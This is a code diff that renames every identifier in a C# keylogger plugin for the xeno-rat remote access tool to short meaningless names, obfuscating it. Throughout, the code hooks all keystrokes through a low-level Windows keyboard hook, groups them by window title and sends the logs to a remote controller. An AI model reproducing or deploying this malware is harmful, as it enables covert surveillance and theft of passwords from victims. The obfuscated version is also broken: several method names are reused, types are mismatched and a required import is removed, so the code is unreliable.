@@ -8,383 +8,372 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
-using xeno_rat_client;
+using Microsoft.Win32;
 
-
-namespace Plugin
+namespace P
 {
-    public class Main
+    public class M
     {
-        bool started = false;
-        bool owner = true;
-        bool FULLSTOP = false;
-        IntPtr key_hook= IntPtr.Zero;
-        CancellationTokenSource FULLSTOP_token = new CancellationTokenSource();
-        Dictionary<string, string> applicationkeylogs;
-        string pipename = "OfflineKeyloggerPipe";
-        NamedPipeClientStream client;
-        Node node;
-        public async Task Run(Node node)// get server side intergation (I mean like xeno-rat gui) into this too (of course). Oh and last but not least, PROPER ERROR HANDLING, this is a mess waiting to happen!
+        bool A = false;
+        bool B = true;
+        bool C = false;
+        IntPtr D = IntPtr.Zero;
+        CancellationTokenSource E = new CancellationTokenSource();
+        Dictionary<string, string> F;
+        string G = "OfflineKeyloggerPipe";
+        NamedPipeClientStream H;
+        Process I;
+
+        public async Task J(Process K)
         {
-            await node.SendAsync(new byte[] { 3 });
-            this.node = node;
+            await K.SendAsync(new byte[] { 3 });
+            I = K;
             try
             {
-                if (!PipeExists())
+                if (!L())
                 {
-                    StartServer();
+                    M();
                 }
                 else
                 {
-                    owner = false;
-                    client = new NamedPipeClientStream(".", pipename, PipeDirection.InOut, PipeOptions.Asynchronous);
-                    await client.ConnectAsync();
+                    B = false;
+                    H = new NamedPipeClientStream(".", G, PipeDirection.InOut, PipeOptions.Asynchronous);
+                    await H.ConnectAsync();
                 }
-                await node.SendAsync(new byte[] { 1 });
+                await K.SendAsync(new byte[] { 1 });
             }
-            catch 
+            catch
             {
-                await node.SendAsync(new byte[] { 0 });
+                await K.SendAsync(new byte[] { 0 });
                 await Task.Delay(1000);
                 return;
             }
-            while (node.Connected()) 
+            while (K.Connected())
             {
                 try
                 {
-                    byte[] data = await node.ReceiveAsync();
-                    Console.WriteLine(data[0]);
-                    if (data == null)
+                    byte[] N = await K.ReceiveAsync();
+                    Console.WriteLine(N[0]);
+                    if (N == null)
                     {
                         break;
                     }
-                    else if (data[0] == 0)
+                    else if (N[0] == 0)
                     {
-                        byte[] hasstarted = new byte[] { 0 };
-                        if (await IsStarted())
+                        byte[] O = new byte[] { 0 };
+                        if (await P())
                         {
-                            hasstarted = new byte[] { 1 };
+                            O = new byte[] { 1 };
                         }
-                        await node.SendAsync(hasstarted);
+                        await K.SendAsync(O);
                     }
-                    else if (data[0] == 1)
+                    else if (N[0] == 1)
                     {
                         Console.WriteLine("start");
-                        Start();
+                        Q();
                     }
-                    else if (data[0] == 2)
+                    else if (N[0] == 2)
                     {
-                        await Stop();
+                        await R();
                     }
-                    else if (data[0] == 3)
+                    else if (N[0] == 3)
                     {
-                        Dictionary<string, string> logs = await GetKeylogs();
-                        byte[] dict_data = ConvertDictionaryToBytes(logs);
-                        await node.SendAsync(dict_data);
-
+                        Dictionary<string, string> S = await T();
+                        byte[] U = V(S);
+                        await K.SendAsync(U);
                     }
-                    else if (data[0] == 4)
+                    else if (N[0] == 4)
                     {
-                        await DO_FULLSTOP();
-                        node.Disconnect();
+                        await W();
+                        K.Disconnect();
                         break;
                     }
                 }
-                catch (Exception e)
+                catch (Exception X)
                 {
-                    node.Disconnect();
+                    K.Disconnect();
                     break;
                 }
             }
-            if (owner) 
+            if (B)
             {
-                while (!FULLSTOP) 
+                while (!C)
                 {
                     await Task.Delay(1000);
                 }
             }
-
         }
 
-        public bool PipeExists() 
+        public bool L()
         {
-            return Directory.GetFiles(@"\\.\pipe\").Contains($@"\\.\pipe\{pipename}");
+            return Directory.GetFiles(@"\\.\pipe\").Contains($@"\\.\pipe\{G}");
         }
 
-        public async Task StartServer() 
+        public async Task M()
         {
-
-            applicationkeylogs = new Dictionary<string, string>();
-            //keylogloop();
-            while (!FULLSTOP)
+            F = new Dictionary<string, string>();
+            while (!C)
             {
-                NamedPipeServerStream server = new NamedPipeServerStream(pipename, PipeDirection.InOut, 254, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
-                await server.WaitForConnectionAsync(FULLSTOP_token.Token);
-                if (FULLSTOP)
+                NamedPipeServerStream Y = new NamedPipeServerStream(G, PipeDirection.InOut, 254, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
+                await Y.WaitForConnectionAsync(E.Token);
+                if (C)
                 {
-                    server.Dispose();
+                    Y.Dispose();
                     break;
                 }
-                Handler(server);
+                Z(Y);
             }
         }
 
-        public async Task Handler(NamedPipeServerStream server) 
+        public async Task Z(NamedPipeServerStream aa)
         {
-            while (!FULLSTOP)
+            while (!C)
             {
-                byte[] recv = new byte[] { 0 };
-                int recvlen = 0;
+                byte[] ba = new byte[] { 0 };
+                int ca = 0;
                 try
                 {
-                    recvlen = await server.ReadAsync(recv, 0, 1, FULLSTOP_token.Token);
+                    ca = await aa.ReadAsync(ba, 0, 1, E.Token);
                 }
                 catch { }
-                if (recvlen == 0)
+                if (ca == 0)
                 {
                     try
                     {
-                        server.Disconnect();
+                        aa.Disconnect();
                     }
                     catch { }
-                    server.Dispose();
+                    aa.Dispose();
                     break;
                 }
-                if (recv[0] == 1)
+                if (ba[0] == 1)
                 {
-                    byte istarted = 0;
-                    if (started)
+                    byte da = 0;
+                    if (A)
                     {
-                        istarted = 1;
+                        da = 1;
                     }
                     try
                     {
-                        await server.WriteAsync(new byte[] { 1, istarted }, 0, 2);
-                    }
-                    catch { }
-                }
-                else if (recv[0] == 2)
-                {
-                    started = true;
-                }
-                else if (recv[0] == 3)
-                {
-                    started = false;
-                }
-                else if (recv[0] == 4)
-                {
-                    try
-                    {
-                        byte[] op = new byte[] { 4 };
-                        byte[] payload = ConvertDictionaryToBytes(applicationkeylogs);
-                        byte[] length = node.sock.IntToBytes(payload.Length);
-                        byte[] partial_payload = SocketHandler.Concat(length, payload);
-                        byte[] final_payload = SocketHandler.Concat(op, partial_payload);
-                        await server.WriteAsync(final_payload, 0, final_payload.Length);
+                        await aa.WriteAsync(new byte[] { 1, da }, 0, 2);
                     }
                     catch { }
                 }
-                else if (recv[0] == 5) 
+                else if (ba[0] == 2)
                 {
-                    FULLSTOP = true;
+                    A = true;
+                }
+                else if (ba[0] == 3)
+                {
+                    A = false;
+                }
+                else if (ba[0] == 4)
+                {
                     try
                     {
-                        FULLSTOP_token.Cancel();
-                        FULLSTOP_token.Dispose();
-                        server.Dispose();
+                        byte[] ea = new byte[] { 4 };
+                        byte[] fa = V(F);
+                        byte[] ga = Utils.IntToBytes(fa.Length);
+                        byte[] ha = SocketHandler.Concat(ga, fa);
+                        byte[] ia = SocketHandler.Concat(ea, ha);
+                        await aa.WriteAsync(ia, 0, ia.Length);
+                    }
+                    catch { }
+                }
+                else if (ba[0] == 5)
+                {
+                    C = true;
+                    try
+                    {
+                        E.Cancel();
+                        E.Dispose();
+                        aa.Dispose();
                     }
                     catch { }
                     return;
                 }
             }
-
         }
 
-        public async Task DO_FULLSTOP() 
+        public async Task W()
         {
-            if (owner) 
+            if (B)
             {
-                FULLSTOP = true;
-                FULLSTOP_token.Cancel();
-                FULLSTOP_token.Dispose();
-                if (key_hook != IntPtr.Zero)
+                C = true;
+                E.Cancel();
+                E.Dispose();
+                if (D != IntPtr.Zero)
                 {
-                    UnhookWindowsHookEx(key_hook);
-                    key_hook = IntPtr.Zero;
+                    UnhookWindowsHookEx(D);
+                    D = IntPtr.Zero;
                 }
                 return;
             }
             try
             {
-                await client.WriteAsync(new byte[] { 5 }, 0, 1);
+                await H.WriteAsync(new byte[] { 5 }, 0, 1);
             }
             catch { }
         }
 
-        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        public IntPtr X(int ba, IntPtr bb, IntPtr bc)
         {
-            if (started && nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (A && ba >= 0 && bb == (IntPtr)WM_KEYDOWN)
             {
-                int vkCode = Marshal.ReadInt32(lParam);
-                bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
-                string character = GetCharacterFromKey((uint)vkCode, isShiftPressed);
-                string open_application = Utils.GetCaptionOfActiveWindow().Replace("*", "");
-                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)//check for caps lock
+                int bd = Marshal.ReadInt32(bc);
+                bool be = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
+                string bf = Y((uint)bd, be);
+                string bg = Utils.GetCaptionOfActiveWindow().Replace("*", "");
+                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)
                 {
-                    character = character.ToUpper();
+                    bf = bf.ToUpper();
                 }
-                if (!applicationkeylogs.ContainsKey(open_application))
+                if (!F.ContainsKey(bg))
                 {
-                    applicationkeylogs.Add(open_application, "");
+                    F.Add(bg, "");
                 }
-                applicationkeylogs[open_application] += character;
+                F[bg] += bf;
             }
-            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+            return CallNextHookEx(IntPtr.Zero, ba, bb, bc);
         }
 
-
-        public async Task keylogloop() 
+        public async Task Y()
         {
-            while (!FULLSTOP) 
+            while (!C)
             {
-                if (!started) 
+                if (!A)
                 {
                     await Task.Delay(1000);
                 }
-                string retchar = await GetKey();
-                if (retchar != null)
+                string bh = await Z();
+                if (bh != null)
                 {
-                    string open_application = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*","");
-                    if (!applicationkeylogs.ContainsKey(open_application)) 
+                    string bi = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*", "");
+                    if (!F.ContainsKey(bi))
                     {
-                        applicationkeylogs.Add(open_application, "");
+                        F.Add(bi, "");
                     }
-                    applicationkeylogs[open_application] += retchar;
+                    F[bi] += bh;
                 }
             }
         }
 
-        private static byte[] ConvertDictionaryToBytes(Dictionary<string, string> dictionary)
+        private static byte[] V(Dictionary<string, string> bj)
         {
-            List<byte> byteList = new List<byte>();
+            List<byte> bk = new List<byte>();
 
-            foreach (var kvp in dictionary)
+            foreach (var bl in bj)
             {
-                byteList.AddRange(Encoding.UTF8.GetBytes(kvp.Key));
-                byteList.Add(0); // Null terminator between key and value
-                byteList.AddRange(Encoding.UTF8.GetBytes(kvp.Value));
-                byteList.Add(0); // Null terminator between value pairs
+                bk.AddRange(Encoding.UTF8.GetBytes(bl.Key));
+                bk.Add(0);
+                bk.AddRange(Encoding.UTF8.GetBytes(bl.Value));
+                bk.Add(0);
             }
 
-            return byteList.ToArray();
+            return bk.ToArray();
         }
 
-        private static Dictionary<string, string> ConvertBytesToDictionary(byte[] data, int offset)
+        private static Dictionary<string, string> W(byte[] bm, int bn)
         {
-            Dictionary<string, string> dictionary = new Dictionary<string, string>();
-            string currentKey = null;
-            StringBuilder currentValue = new StringBuilder();
+            Dictionary<string, string> bo = new Dictionary<string, string>();
+            string bp = null;
+            StringBuilder bq = new StringBuilder();
 
-            for (int i = offset; i < data.Length; i++)
+            for (int br = bn; br < bm.Length; br++)
             {
-                byte currentByte = data[i];
+                byte bs = bm[br];
 
-                if (currentByte == 0)
+                if (bs == 0)
                 {
-                    // Null terminator indicates the end of a key or a value
-                    if (currentKey == null)
+                    if (bp == null)
                     {
-                        currentKey = currentValue.ToString(); // Use ToString to get the string
-                        currentValue.Clear();
+                        bp = bq.ToString();
+                        bq.Clear();
                     }
                     else
                     {
-                        dictionary[currentKey] = currentValue.ToString(); // Use ToString to get the string
-                        currentKey = null;
-                        currentValue.Clear();
-
+                        bo[bp] = bq.ToString();
+                        bp = null;
+                        bq.Clear();
                     }
                 }
                 else
                 {
-                    currentValue.Append((char)currentByte);
+                    bq.Append((char)bs);
                 }
             }
 
-            return dictionary;
+            return bo;
         }
 
-
-
-        public async Task<Dictionary<string, string>> GetKeylogs(int count=0) 
+        public async Task<Dictionary<string, string>> T(int bo = 0)
         {
-            if (count > 3)
+            if (bo > 3)
             {
                 return null;
             }
-            if (owner)
+            if (B)
             {
-                return applicationkeylogs;
+                return F;
             }
-            await client.WriteAsync(new byte[] { 4 }, 0, 1);
-            byte[] recv_buf = new byte[] { 0, 0,0,0,0 };
-            CancellationTokenSource token = new CancellationTokenSource(2000);
+            await H.WriteAsync(new byte[] { 4 }, 0, 1);
+            byte[] bt = new byte[] { 0, 0, 0, 0, 0 };
+            CancellationTokenSource bu = new CancellationTokenSource(2000);
             try
             {
-                await client.ReadAsync(recv_buf, 0, 5, token.Token);
+                await H.ReadAsync(bt, 0, 5, bu.Token);
             }
             catch { }
-            token.Dispose();
-            if (recv_buf[0] == 4)
+            bu.Dispose();
+            if (bt[0] == 4)
             {
-                int len= node.sock.BytesToInt(recv_buf, 1);
-                token = new CancellationTokenSource(5000);
-                recv_buf=new byte[len];
-                int recvied = 0;
+                int bv = I.sock.BytesToInt(bt, 1);
+                bu = new CancellationTokenSource(5000);
+                bt = new byte[bv];
+                int bw = 0;
                 try
                 {
-                    int totalBytesReceived = 0;
+                    int bx = 0;
 
-                    while (totalBytesReceived < len)
+                    while (bx < bv)
                     {
-                        recvied = await client.ReadAsync(recv_buf, totalBytesReceived, len - totalBytesReceived, token.Token);
-                        if (recvied == 0)
+                        bw = await H.ReadAsync(bt, bx, bv - bx, bu.Token);
+                        if (bw == 0)
                         {
-                            recvied = 0;
+                            bw = 0;
                             break;
                         }
-                        totalBytesReceived += recvied;
+                        bx += bw;
                     }
                 }
-                catch 
+                catch
                 {
-                    recvied = 0;
+                    bw = 0;
                 }
-                token.Dispose();
-                if (recvied == 0) 
-                { 
-                    return await GetKeylogs(count + 1);
+                bu.Dispose();
+                if (bw == 0)
+                {
+                    return await T(bo + 1);
                 }
-                return ConvertBytesToDictionary(recv_buf, 0);
+                return W(bt, 0);
             }
             else
             {
-                return await GetKeylogs(count + 1);
+                return await T(bo + 1);
             }
-
         }
-        public async Task Start() 
+        public async Task Q()
         {
-            if (owner && !started)
+            if (B && !A)
             {
-                HookCallbackDelegate hcDelegate = HookCallback;
-                Process currproc = Process.GetCurrentProcess();
-                string mainModuleName = currproc.MainModule.ModuleName;
-                currproc.Dispose(); started = true;
+                HookCallbackDelegate by = X;
+                I = Process.GetCurrentProcess();
+                string bz = I.MainModule.ModuleName;
+                I.Dispose();
+                B = true;
                 new Thread(() =>
                 {
-                    key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
+                    D = SetWindowsHookEx(WH_KEYBOARD_LL, by, GetModuleHandle(bz), 0);
                     if (!Application.MessageLoop)
                     {
                         Application.Run();
@@ -392,75 +381,74 @@ namespace Plugin
                 }).Start();
                 return;
             }
-            await client.WriteAsync(new byte[] { 2 }, 0, 1);
+            await H.WriteAsync(new byte[] { 2 }, 0, 1);
         }
-        public async Task Stop()
+        public async Task R()
         {
-            if (owner)
+            if (B)
             {
-                started = false;
+                A = false;
 
-                if (key_hook != IntPtr.Zero) 
+                if (D != IntPtr.Zero)
                 {
-                    UnhookWindowsHookEx(key_hook);
-                    key_hook= IntPtr.Zero;
+                    UnhookWindowsHookEx(D);
+                    D = IntPtr.Zero;
                 }
 
                 return;
             }
-            await client.WriteAsync(new byte[] { 3 }, 0, 1);
+            await H.WriteAsync(new byte[] { 3 }, 0, 1);
         }
-        public async Task<bool> IsStarted(int count=0) 
+        public async Task<bool> P(int bx = 0)
         {
-            if (count > 3) 
+            if (bx > 3)
             {
                 return false;
             }
-            if (owner) 
+            if (B)
             {
-                return started;
+                return A;
             }
-            await client.WriteAsync(new byte[] { 1 }, 0, 1);
-            byte[] recv_buf=new byte[] { 0, 0};
-            CancellationTokenSource token = new CancellationTokenSource(3000);
-            await client.ReadAsync(recv_buf, 0, 2, token.Token);
-            token.Dispose();
-            if (recv_buf[0] == 1)
+            await H.WriteAsync(new byte[] { 1 }, 0, 1);
+            byte[] cb = new byte[] { 0, 0 };
+            CancellationTokenSource cc = new CancellationTokenSource(3000);
+            await H.ReadAsync(cb, 0, 2, cc.Token);
+            cc.Dispose();
+            if (cb[0] == 1)
             {
-                return recv_buf[1] == 1;
+                return cb[1] == 1;
             }
-            else 
+            else
             {
-                return await IsStarted(count + 1);
+                return await P(bx + 1);
             }
         }
-        private async Task<string> GetKey()
+        private async Task<string> Z()
         {
             return await Task.Run(() =>
             {
-                for (int i = 0; i < 255; i++)
+                for (int cd = 0; cd < 255; cd++)
                 {
-                    short state = GetAsyncKeyState(i);
+                    short ce = GetAsyncKeyState(cd);
 
-                    if ((state & 0x8000) != 0 && !keyStates[i])
+                    if ((ce & 0x8000) != 0 && !cf[cd])
                     {
-                        keyStates[i] = true;
+                        cf[cd] = true;
 
-                        bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
-                        string character = GetCharacterFromKey((uint)i, isShiftPressed);
-                        return character;
+                        bool cg = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
+                        string ch = Y((uint)cd, cg);
+                        return ch;
                     }
-                    else if ((state & 0x8000) == 0 && keyStates[i])
+                    else if ((ce & 0x8000) == 0 && cf[cd])
                     {
-                        keyStates[i] = false;
+                        cf[cd] = false;
                     }
                 }
                 return null;
             });
         }
 
-
-        private static Dictionary<uint, string> nonVisibleCharacters = new Dictionary<uint, string>()
+        private static Dictionary<uint, string> ci = new Dictionary<uint, string>()
         {
             { 0x08, "[backspace]" },
             { 0x09, "[tab]" },
@@ -526,33 +514,28 @@ namespace Plugin
             { 0xF7, "[oem clear]" }
         };
 
-        private static bool[] keyStates = new bool[256];
+        private static bool[] cf = new bool[256];
 
-        private static string GetCharacterFromKey(uint virtualKeyCode, bool isShiftPressed)
+        private static string Y(uint cl, bool cm)
         {
-            StringBuilder receivingBuffer = new StringBuilder(5);
-            byte[] keyboardState = new byte[256];
+            StringBuilder cn = new StringBuilder(5);
+            byte[] co = new byte[256];
 
-            // Set the state of Shift key based on the passed parameter
-            keyboardState[0x10] = (byte)(isShiftPressed ? 0x80 : 0);
+            co[0x10] = (byte)(cm ? 0x80 : 0);
 
-            // Map the virtual key to the corresponding character
-            int result = ToUnicode(virtualKeyCode, 0, keyboardState, receivingBuffer, receivingBuffer.Capacity, 0);
+            int cp = ToUnicode(cl, 0, co, cn, cn.Capacity, 0);
 
-            if (result > 0)
+            if (cp > 0)
             {
-                string character = receivingBuffer.ToString();
+                string cq = cn.ToString();
 
-                // Replace non-visible characters with descriptive words using the dictionary
-                if (nonVisibleCharacters.ContainsKey(virtualKeyCode))
+                if (ci.ContainsKey(cl))
                 {
-                    string nonVisibleCharacter = nonVisibleCharacters[virtualKeyCode];
+                    string cr = ci[cl];
 
-                    // Apply Shift key state to the non-visible character
-                    if (isShiftPressed)
+                    if (cm)
                     {
-                        // Apply Shift key modifications based on the non-visible character
-                        switch (nonVisibleCharacter)
+                        switch (cr)
                         {
                             case ";":
                                 return ":";
@@ -579,41 +562,41 @@ namespace Plugin
                         }
                     }
 
-                    return nonVisibleCharacter;
+                    return cr;
                 }
 
-                return character;
+                return cq;
             }
 
             return string.Empty;
         }
 
         [DllImport("user32.dll")]
-        private static extern short GetAsyncKeyState(int vKey);
+        private static extern short GetAsyncKeyState(int cl);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
-        public static extern short GetKeyState(int keyCode);
+        public static extern short GetKeyState(int cl);
 
-        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("user32.dll")]
-        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
+        public delegate IntPtr HookCallbackDelegate(int cl, IntPtr cm, IntPtr cn);
 
         [DllImport("user32.dll")]
-        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        public static extern IntPtr SetWindowsHookEx(int cl, HookCallbackDelegate cm, IntPtr cn, uint co);
+
+        [DllImport("user32.dll")]
+        public static extern bool UnhookWindowsHookEx(IntPtr cp);
 
         [DllImport("kernel32.dll")]
-        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        public static extern IntPtr GetModuleHandle(string cl);
         [DllImport("user32.dll")]
-        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        public static extern IntPtr CallNextHookEx(IntPtr cp, int cl, IntPtr cm, IntPtr cn);
 
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x100;
 
 
         [DllImport("user32.dll")]
-        private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
-            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
-            int bufferSize, uint flags);
-    }
+        private static extern int ToUnicode(uint cl, uint cm, byte[] co,
+            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder cn,
+            int cp, uint cq);
+}
 }
